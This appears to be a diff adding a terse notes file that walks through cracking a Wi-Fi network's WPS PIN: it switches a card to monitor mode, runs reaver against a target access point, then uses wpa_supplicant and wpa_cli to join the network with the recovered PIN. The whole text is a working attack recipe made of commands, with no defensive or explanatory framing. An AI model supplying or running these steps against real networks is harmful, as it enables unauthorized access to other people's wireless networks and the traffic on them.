@@ -1,0 +1,23 @@
+ifconfig wlan0 down
+iwconfig wlan0 mode Monitor
+ifconfig wlan0 up
+
+reaver -i wlan0 -b XX:XX...:XX -o output.txt -v --no-nack --dh-small
+
+
+after getting the pin
+
+/etc/wpa_supplicant.conf:
+--
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+--
+
+wpa_supplicant -iwlan0 -c/etc/wpa_supplicant.conf –B
+
+run wpa_cli
+    status  You should see wpa_state=INACTIVE
+    wps_reg xx:xx:xx:xx:xx:xx 12345678
+        You should see OK, "CTRL-EVENT-CONNECTED"
+    save
